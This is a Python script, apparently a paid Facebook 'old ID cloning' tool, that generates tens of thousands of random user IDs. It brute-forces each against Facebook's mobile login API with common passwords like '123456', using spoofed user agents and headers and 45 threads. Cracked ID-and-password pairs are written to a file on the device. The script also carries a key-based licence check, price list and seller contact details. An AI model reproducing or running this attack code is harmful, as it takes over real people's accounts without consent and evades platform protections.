#-------------------------[WELCOME]---------------------#
#TOOLS OWNER HAFEZ ALI 
#HAFEZ ALI IS BRAND 
#CODING BY ALIxHADIxAshraful
#---------------------------| Import |---------------------------#
import requests,bs4,json,uuid,os,sys,random,datetime,time,re,urllib3,base64,string,platform,httpx,mechanize,rich,json,subprocess
print('<|©|> LOADING SIFAT PAID TOOLS ')
try:
	from time import sleep
	from bs4 import BeautifulSoup as sop
	from datetime import datetime
	from random import randint as rr
	from random import choice as rc
	from string import digits as digits
	from os import system as cmd
	from concurrent.futures import ThreadPoolExecutor as tred 
except ModuleNotFoundError:
	print('<|●|> Module Installing ')
	os.system("pip install httpx")
	
#---------------------------| User Agent Up System 2 |---------------------------#
def ___uax___():
    aV=str(random.choice(range(10,20)))
    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
    bV=str(random.choice(range(1,36)))
    bx=str(random.choice(range(34,38)))
    bz=f"5{bx}.{bV}"
    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
    cV=str(random.choice(range(1,36)))
    cx=str(random.choice(range(34,38)))
    cz=f"5{cx}.{cV}"
    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
    return random.choice([A,B,C,D])
#---------------------------| User Agent |---------------------------#
ugen=[]
uas=[]
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]

#---------------------------| Colour |---------------------------#
white = '\x1b[1;97m';green = '\x1b[38;5;48m';ping = '\x1b[38;5;205m';rr = random.randint;rc = random.choice
G="\x1b[38;5;46m";W="\x1b[38;5;15m";B="\x1b[38;5;8m";Y="\x1b[38;5;226m";A="\x1b[38;5;123m";R="\x1b[38;5;160m";O="\x1b[38;5;81m";X="\x1b[38;5;205m";P="\033[0;34m"
#-----------------------• STYLE •-----------------------#
xd=f"{G}•{W}";xd1=f"{G}•{W}1";xd2=f"{G}•{W}2";xd3=f"{G}•{W}3";xd4=f"{G}•{W}4";xd5=f"{G}•{W}5";xd0=f"{G}•{W}0";xdx=f"{G}•{W}?";xdxx=f"{G}•{W}"
#---------------------------| Loop |---------------------------#
pwpluss,pwnya,dump,id,id2,tokenku,method,loop,ok,cp=[],[],[],[],[],[],[],0,0,0;user=[];memek=[]
#---------------------------| Linex |---------------------------#
def clear():os.system('clear');print(logo)
def linex():print(f'{white}───────────────────────────────────────────────')
#---------------------------| Logo |---------------------------#
logo=(f"""\x1b[1;97m
\033[0;92{G}                                                   
┏┓┳┏┓┏┓┏┳┓
┗┓┃┣ ┣┫ ┃ 
┗┛┻┻ ┛┗ ┻                                                                                                                                                         
\x1b[10;93m╠══[Author                   • \x1b[1;38mMD. SIFAT HOSSAIN ]      
\x1b[10;91m╠══[Facebook                 • \x1b[1;38mMD. SIFAT HOSSAIN ]       
\x1b[10;97m╠══[Github                   • \x1b[1;38msifat403 ]      
\x1b[10;94m╠══[Teligerm                 • https://t.me/sifat121255 ] 
\x1b[10;94m╠══[Whatapp                  • 01848580864 ]  
\x1b[10;95m╠══[TOOLS                    • PAID ]             
\x1b[10;93m╠══[VERSION                  • 2.1 ]           \x1b[10;92m
\x1b[38;5;50m\x1b[38;5;254m──────────────────────────────────────────────────────────────\x1b[38;5;50m
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92mASSALAMU ALAIKUM \033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●                  \033[1;91m[\033[1;92m√\033[1;91m]
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92mSIFAT 👨‍💻\033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●             \033[1;91m[\033[1;92m√\033[1;91m]
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱""")   
#---------------------------| Menux |---------------------------#
def _____menux_____():
	clear()
	print(f"{white}<|1|> OLD Cloning ");linex();option=input(f"{white}<|?|> Choice >> ")
	if option in ["1"]:_____oldx_____()
	else:exit()
#---------------------------| Old |---------------------------#
def _____oldx_____():
	clear()
	limit = str((99999))
	for nmbr in range(int(limit)):
		nmp = ''.join(rc(digits) for _ in range(10))
		user.append(nmp)
	with tred(max_workers=45) as ALIx:
		clear();tl = str(len(user))
		print(f"{white}               TOTAL UID CLONING {white}<<{green}{tl}{white}>> ");linex()
		for love in user:
			uid=str("10000"+love);pas=['123456','1234567','12345678','123456789']
			ALIx.submit(____old____,uid,pas,tl)
	print("");linex();print(f"{white}<|●|> Cloning Complete Brother ");print(f'{white}<|●|> Total Ok >> '+str(len(ok)));print(f'{white}<|●|> Total Cp >> '+str(len(cp)));linex();exit()			
#---------------------------| Old Uid Method |---------------------------#
def ____old____(uid,pas,tl):
	global loop,ok
	sys.stdout.write(f"\r\r{white}<|SIFAT-XD|> <|{loop}|> <|{ok}|> ");sys.stdout.flush()
	try:
		for ps in pas:
			with requests.Session() as session:
				headers={'x-fb-connection-bandwidth': str(rr(20000000,29999999)),'x-fb-sim-hni': str(rr(20000,40000)),'x-fb-net-hni': str(rr(20000,40000)),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent': ___uax___(),'content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
			po=session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(ps)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true",headers=headers).json()
			if "Please Confirm Email" in str(po):
				print(f"\r\r{green}<|SIFAT-OK|> {uid} ● {ps}")
				open("/sdcard/SIFAT-OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
				break
			elif "session_key" in po:
				print(f"\r\r{green}<|SIFAT-OK|> {uid} ● {ps}")
				open("/sdcard/SIFAT-OLD-OK.txt",'a').write(str(uid)+"|"+str(ps)+"\n");ok+=1
				break
			else:pass
		loop+=1
	except Exception as e:pass
#---------------------------| END |---------------------------#
def meyexudi():
  os.system('clear')
  print(logo)
  
  uuid = "md"+str(os.getuid())+"sifat"+str(os.getuid())+"PAID.TOOL"
  id = ''.join(uuid)
  try:
    httpCaht = requests.get(f"https://github.com/sifat403/sifatapprval/blob/main/'old%20updeat.py'").text
    if id in httpCaht:
      msg = str(os.geteuid())
      print()
      pass
    else:
      print(" \033[32;1m[+] Your Key : "+id)
      print(' \x1b[38;5;208m╔══[𝟷]💥  ID LOGIN 80%')      
      print(' \x1b[1;98m║══[•]💥  ONLY 2009-2014 ID CLONE ')
      print(' \x1b[1;93m║══[•]💥  Buy Tool method free')
      print(' \x1b[1;97m║══[•]💥  WI-FI  AND DATA BOTH WORKING 100%')
      print(' \x1b[38;5;50m║══[•]💥  7 DAY 150 TAKA ')
      print(' \x1b[1;95m║══[•]💥  15 DAY 250 TAKA ')
      print(' \x1b[38;5;50m║══[•]💥  30 DAY 400 TAKA ')
      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   SIFAT, TOLLS,   Please,   Send,   Your,   Key,"')
      print(" \x1b[0m║══[KEY]  : "+id)
      uname =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m: \33[1;32m')
      input(' \033[1;30m╚══[•] IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801848580864?text='+tks),approval()       
  except:
    sys.exit()
print(logo)
meyexudi()
_____menux_____()
